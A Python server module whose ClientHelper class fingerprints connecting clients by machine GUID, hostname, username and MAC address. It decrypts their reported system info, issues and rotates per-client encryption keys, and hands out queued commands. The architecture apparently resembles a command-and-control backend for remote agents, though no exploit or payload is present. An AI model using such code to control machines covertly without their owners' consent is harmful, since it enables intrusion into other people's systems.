import os
import base64
import logging
from datetime import datetime
from utils.client_identity import extract_system_info

logger = logging.getLogger(__name__)

class ClientHelper:
    """Handles client identification, verification, and command management"""
    
    def __init__(self, client_manager, crypto_helper, server):
        self.client_manager = client_manager
        self.crypto_helper = crypto_helper
        self.server = server
    
    def identify_client(self, client_ip, headers, system_info_raw=None):
        """
        Identify a client based on headers and system info
        
        Returns:
            tuple: (client_id, system_info, newly_identified, first_contact)
        """
        client_identifier = headers.get('X-Client-ID')
        client_rotation_id = headers.get('X-Rotation-ID')
        
        identified_client_id = None
        system_info = {}
        newly_identified = False
        first_contact = False
        
        # First try to identify by X-Client-ID header
        if client_identifier:
            # Check if this client_identifier is already known
            for existing_id, client_info in self.client_manager.get_clients_info().items():
                if client_info.get('system_info', {}).get('client_identifier') == client_identifier:
                    identified_client_id = existing_id
                    logger.info(f"Recognized client by X-Client-ID {client_identifier} as {identified_client_id}")
                    break
        
        # Process system info if available
        if system_info_raw:
            try:
                # Try to decrypt if encrypted, but handle unencrypted initial requests
                system_info_json = None
                try:
                    # First try treating it as encrypted data
                    system_info_json = self.crypto_helper.crypto_manager.decrypt(system_info_raw)
                    logger.info(f"Successfully decrypted system info from {client_ip}")
                except Exception as e:
                    # If decryption fails, it might be the initial connection without encryption
                    system_info_json = system_info_raw
                    first_contact = True
                    logger.info(f"Identified initial contact from {client_ip} - processing unencrypted data")
                
                # Extract key system properties
                try:
                    hostname, username, machine_guid, os_version, mac_address, system_info = extract_system_info(system_info_json)
                except Exception as e:
                    logger.error(f"Error extracting system information: {str(e)}")
                    # For errors in the initial contact, create a placeholder system_info
                    if first_contact:
                        system_info = {"ip": client_ip}
                        if client_identifier:
                            system_info['client_identifier'] = client_identifier
                        hostname = "Unknown"
                        username = "Unknown"
                        machine_guid = "Unknown"
                        os_version = "Unknown"
                        mac_address = "Unknown"
                    else:
                        # Re-raise for established clients - their data should be valid
                        raise
                
                # Add IP to system info
                system_info['ip'] = client_ip
                
                # Add unique client identifier if provided in headers
                if client_identifier and 'client_identifier' not in system_info:
                    system_info['client_identifier'] = client_identifier
                    
                # If we haven't identified the client by identifier, use system info
                if not identified_client_id:
                    # Check if we can identify by machine_guid if available
                    if machine_guid != "Unknown":
                        for existing_id, client_info in self.client_manager.get_clients_info().items():
                            if client_info.get('machine_guid') == machine_guid:
                                identified_client_id = existing_id
                                logger.info(f"Recognized client by Machine GUID {machine_guid} as {identified_client_id}")
                                break
                    
                    # If still not identified, check hostname + username combo
                    if not identified_client_id and hostname != "Unknown" and username != "Unknown":
                        for existing_id, client_info in self.client_manager.get_clients_info().items():
                            if (client_info.get('hostname') == hostname and 
                                client_info.get('username') == username):
                                identified_client_id = existing_id
                                logger.info(f"Recognized client by hostname/username {hostname}/{username} as {identified_client_id}")
                                break
                
                # If we identified the client, update info, otherwise register as new
                if identified_client_id:
                    # Update the existing client information
                    client_id = identified_client_id
                    # Use add_client to update information but preserve existing client ID
                    self.client_manager.add_client(
                        ip=client_ip,
                        hostname=hostname,
                        username=username,
                        machine_guid=machine_guid,
                        os_version=os_version,
                        mac_address=mac_address,
                        system_info=system_info,
                        existing_id=client_id  # Pass existing ID to prevent reassignment
                    )
                else:
                    # Register as new client
                    client_id = self.client_manager.add_client(
                        ip=client_ip,
                        hostname=hostname,
                        username=username,
                        machine_guid=machine_guid,
                        os_version=os_version,
                        mac_address=mac_address,
                        system_info=system_info
                    )
                    newly_identified = True
                    # For completely new clients, mark as first contact for key issuance
                    if first_contact or not self.client_manager.has_unique_key(client_id):
                        first_contact = True
                
                logger.info(f"Client identified as {client_id} ({hostname}/{username}){' - FIRST CONTACT' if first_contact else ''}")
                
            except Exception as e:
                logger.error(f"Error processing system information: {str(e)}")
                # Fall back to IP-based identification
                client_id = client_ip
                self.client_manager.add_client(client_id)
                newly_identified = True
                first_contact = True
        else:
            # Fall back to IP-based identification if no system info
            if not identified_client_id:
                client_id = client_ip
                self.client_manager.add_client(client_id)
                newly_identified = True
                first_contact = True
            else:
                client_id = identified_client_id
            
        return client_id, system_info, newly_identified, first_contact

    def verify_client(self, client_id, system_info):
        """
        Verify client identity using the server's client_verifier
        
        Returns:
            tuple: (is_verified, confidence, needs_key_rotation, warnings)
        """
        needs_key_rotation = False
        
        # Default values if verification is not possible
        is_verified = False
        confidence = 0
        warnings = ["Verification not performed"]
        
        # Verify client identity if verifier is available
        if hasattr(self.server, 'client_verifier') and self.server.client_verifier:
            verifier = self.server.client_verifier
            is_verified, confidence, warnings = verifier.verify_client(client_id, system_info)
            
            # Add logging for verification status
            logger.info(f"Verification result for {client_id}: verified={is_verified}, confidence={confidence}")
            
            # Update client verification status
            self.client_manager.set_verification_status(client_id, is_verified, confidence, warnings)
            
            # Check if client needs key rotation
            has_unique_key = self._has_unique_key(client_id)
            
            # Check for manual key rotation request 
            requested_key_rotation = any(
                cmd.get('command_type') == 'key_rotation' 
                for cmd in self.client_manager.get_pending_commands(client_id)
            )

            # Decide if key rotation is needed
            needs_key_rotation = (is_verified and (not has_unique_key or requested_key_rotation))
            
            if requested_key_rotation:
                logger.info(f"Manual key rotation requested for client {client_id}")
                
            if not is_verified:
                warning_str = ", ".join(warnings)
                logger.warning(f"Client {client_id} identity suspicious (confidence: {confidence:.1f}%): {warning_str}")
            
            # Register/update this client information for future reference
            verifier.register_client(client_id, system_info)
            
        return is_verified, confidence, needs_key_rotation, warnings
    
    def _has_unique_key(self, client_id):
        """Check if client has a unique encryption key"""
        if hasattr(self.client_manager, 'has_unique_key'):
            return self.client_manager.has_unique_key(client_id)
        else:
            # Fallback to direct check
            return hasattr(self.client_manager, 'client_keys') and client_id in self.client_manager.client_keys
    
    def prepare_key_issuance(self, client_id):
        """
        Prepare a key issuance for a new client
        
        Returns:
            dict: Key issuance command object
        """
        # Generate a new unique key for this client
        new_key = os.urandom(32)  # 256-bit key
        base64_key = base64.b64encode(new_key).decode('utf-8')
        
        # Store the client's unique key
        self.client_manager.set_client_key(client_id, new_key)
        
        # Create key issuance command
        key_issuance_command = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "command_type": "key_issuance",
            "args": base64_key
        }
        
        logger.info(f"Key issuance command created for client {client_id}")
        
        return key_issuance_command
    
    def prepare_key_rotation(self, client_id):
        """
        Prepare a key rotation command for the client
        
        Returns:
            dict: Key rotation command object
        """
        # Generate a new unique key for this client
        new_key = os.urandom(32)  # 256-bit key
        base64_key = base64.b64encode(new_key).decode('utf-8')
        
        # Store the client's unique key
        self.client_manager.set_client_key(client_id, new_key)
        
        # Create key rotation command
        key_rotation_command = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "command_type": "key_rotation",
            "args": base64_key
        }
        
        logger.info(f"Key rotation command issued for client {client_id}")
        
        return key_rotation_command
    
    def organize_commands(self, client_id, include_key_rotation=False, first_contact=False):
        """
        Organize commands for client including key rotation if needed
        
        Args:
            client_id: Client identifier
            include_key_rotation: Whether to include key rotation command
            first_contact: Whether this is the first contact from client
            
        Returns:
            tuple: (commands, has_key_operation)
        """
        commands = []
        has_key_operation = False
        
        # For first contact, only send a key issuance command
        if first_contact:
            key_issuance_command = self.prepare_key_issuance(client_id)
            commands.append(key_issuance_command)
            has_key_operation = True
            return commands, has_key_operation
        
        # Get pending commands for established clients
        commands = self.client_manager.get_pending_commands(client_id)
        
        # Move any key rotation commands to the front
        for i, command in enumerate(commands):
            if command.get('command_type') == 'key_rotation':
                has_key_operation = True
                if i > 0:  # Move to front if not already there
                    commands.insert(0, commands.pop(i))
                break
        
        # Add key rotation command if needed and not already present
        if include_key_rotation and not has_key_operation:
            key_rotation_command = self.prepare_key_rotation(client_id)
            commands.insert(0, key_rotation_command)
            has_key_operation = True
        
        return commands, has_key_operation
    
    def clear_commands_after_rotation(self, client_id):
        """Clear key rotation commands but keep other commands"""
        pending_commands = self.client_manager.get_pending_commands(client_id)
        non_rotation_commands = [cmd for cmd in pending_commands if cmd.get('command_type') != 'key_rotation']
        
        # Clear all commands then add back non-rotation ones
        self.client_manager.clear_pending_commands(client_id)
        
        for cmd in non_rotation_commands:
            self.client_manager.add_command(
                client_id, 
                cmd.get('command_type'), 
                cmd.get('args')
            )